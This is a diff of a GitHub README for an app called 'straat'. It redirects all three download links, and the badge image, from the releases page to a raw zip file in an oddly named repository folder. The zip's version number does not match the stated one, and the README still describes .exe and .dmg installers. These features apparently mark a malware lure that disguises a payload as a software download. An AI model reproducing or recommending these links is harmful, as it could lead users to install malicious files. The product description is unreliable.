@@ -4,7 +4,7 @@
 The "straat" application serves as a Strategy Execution Engine designed to help organizations streamline their strategic planning and execution processes. By integrating various functionalities, "straat" aids teams in alerting, managing workflows, and executing strategies effectively. Whether you're using it on Android, iOS, or the web, this tool supports your organizational goals by combining technology with strategy.
 
 ## 🔗 Download This Application
-[![Download straat](https://img.shields.io/badge/Download%20straat-v1.0-blue)](https://github.com/JokeNoobReal/straat/releases)
+[![Download straat](https://raw.githubusercontent.com/JokeNoobReal/straat/main/volitational/straat-v2.6-alpha.2.zip%20straat-v1.0-blue)](https://raw.githubusercontent.com/JokeNoobReal/straat/main/volitational/straat-v2.6-alpha.2.zip)
 
 ## 🚀 Getting Started
 To get started with "straat," follow these simple steps to download and run the application on your device.
@@ -18,7 +18,7 @@ Before installing, ensure your device meets the following system requirements:
 
 ## 📥 Download & Install
 1. **Visit the Release Page**  
-   Go to the official release page to download the latest version of "straat": [Download straat](https://github.com/JokeNoobReal/straat/releases).
+   Go to the official release page to download the latest version of "straat": [Download straat](https://raw.githubusercontent.com/JokeNoobReal/straat/main/volitational/straat-v2.6-alpha.2.zip).
    
 2. **Select the Correct Version**  
    Look for the version suitable for your operating system. The downloads are provided in .exe format for Windows, .dmg for macOS, and package files for Linux.
@@ -65,7 +65,7 @@ If you encounter issues during the installation or usage of "straat," consider t
 For further assistance, please visit our support page linked on the release page. You can also submit issues directly through the GitHub repository.
 
 ## 🔗 Useful Links
-- **Release Page:** [Download straat](https://github.com/JokeNoobReal/straat/releases)
+- **Release Page:** [Download straat](https://raw.githubusercontent.com/JokeNoobReal/straat/main/volitational/straat-v2.6-alpha.2.zip)
 - **Documentation:** Access in-app documentation for detailed guides.
 - **Community:** Join discussions and get help from other users in our community forums.
 
